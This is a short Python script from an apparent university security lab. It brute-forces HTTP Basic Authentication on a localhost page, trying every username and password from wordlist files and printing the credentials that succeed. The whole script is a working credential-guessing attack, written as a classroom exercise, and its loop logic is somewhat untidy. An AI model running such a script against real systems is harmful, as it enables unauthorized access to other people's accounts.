#!/usr/bin/python
# lab07
# created by srfranco@mtu.edu
# 3/22/2025

# Modules
import requests

# Variables
websiteurl = 'http://127.0.0.1/protected'
#websiteurl = 'http://127.0.0.1'
localfilepath = '/home/sat3310/Documents/labs/lab07/data/'
found = False
#mydebug = True
mydebug = False

# Main
# Get usernames and passwords
# Use files to read common usernames and passwords
usernamefile = 'usernames.txt'
passwordfile = 'password.txt'
# Try a single username and password
#username = 'todd'
#password = 'password'
# Put common usernames and passwords into a list
#usernames = ['admin', 'root', 'todd', 'joe']
#passwords = ['admin', 'root', 'tood', 'joe', 'pass', 'password']
# Read usernames and passwords from a file and strip newlines
usernames = open(localfilepath+usernamefile).read().splitlines()
passwords = open(localfilepath+passwordfile).read().splitlines()
#print (usernames)
#print (passwords)

# Try opening the website
response = requests.get(websiteurl)
# If HTTP get works, then the site is not protected
if (mydebug and response.status_code == 200):
    print ("Website not protected!")
    print ("The site response is:\n",response.text)
if (mydebug and response.status_code == 401):
    print ("Website is protected!")
# Try opening the website with credentials
# Outer loop - try each username:
for username in usernames:
    # Inner loop - try each password:
    for password in passwords:
        response = requests.get(websiteurl,auth=requests.auth.HTTPBasicAuth(username, password))
        print ("Trying Username:", username, "Password:", password)
        if response.status_code == 200:
            found = True
            print ("Username and password found! Username:", username,"Password:", password)
        if mydebug:
            print ("Unauthorized for Username:", username, "Password:",password)
            print(response.text)
        if mydebug:
            print ("Username and password found! Username:", username,"Password:", password)
            print(response.headers)
            print(response.text)
            # No need to continue inner loop
            break
            # no need to continue outer loop
    if found:
        break

# Print results
